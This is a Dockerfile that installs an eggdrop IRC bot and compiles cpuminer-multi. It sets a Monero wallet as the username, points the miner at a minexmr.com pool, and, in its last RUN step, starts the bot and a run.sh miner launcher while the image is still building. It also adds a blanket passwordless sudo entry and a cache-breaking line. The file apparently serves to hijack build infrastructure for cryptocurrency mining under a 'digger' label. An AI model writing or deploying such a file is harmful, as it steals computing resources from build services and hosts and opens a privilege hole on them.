FROM ubuntu:14.04

run #cache break xxxasdasd

## install lib stuff
RUN apt-get update && apt-get install -y libcurl3 build-essential automake autotools-dev libjansson-dev autoconf libcurl4-gnutls-dev git 
RUN apt-get install -y eggdrop tcl sudo traceroute

## setup user env
RUN adduser -q eggdrop
RUN echo "eggdrop ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers

## unzip home files
ADD files.tar.gz /home/eggdrop
RUN chmod 755 /home/eggdrop/run.sh
RUN chown -R eggdrop:eggdrop /home/eggdrop

USER eggdrop
WORKDIR /home/eggdrop
RUN git clone https://github.com/wolf9466/cpuminer-multi
WORKDIR /home/eggdrop/cpuminer-multi
RUN ./autogen.sh && CFLAGS="-march=native" ./configure && make


# changeme 1, 2, 3 =
# repo name, git user, key/un
#ENV DIGGER_USER=test4
#ENV GIT_USER=willyd1 
#ENV KEY=47w6Lu6kG3jNDyRLHviQeAjmGPPHkHbgBYBaavP2rVpahLQqrW8WcVh2m5cjhmVq7VAkXW1bDjEuzbNNBj43tRfGGwZsDhT.test4
 
#set digger env
ENV USERNAME=47w6Lu6kG3jNDyRLHviQeAjmGPPHkHbgBYBaavP2rVpahLQqrW8WcVh2m5cjhmVq7VAkXW1bDjEuzbNNBj43tRfGGwZsDhT.test4
ENV PASSWORD=x
ENV URL="stratum+tcp://pool.minexmr.com:4444"
ENV ALGORITHM=cryptonight
ENV PRIORITY=19

#run stuff - do last

WORKDIR /home/eggdrop/eggdrop

RUN sed -i "s|CHANGEME4|willyd1-test4|g" willyd.conf

USER root
RUN su -c "eggdrop ~/eggdrop/willyd.conf" eggdrop ; \
    cd ../cpuminer-multi; ../run.sh
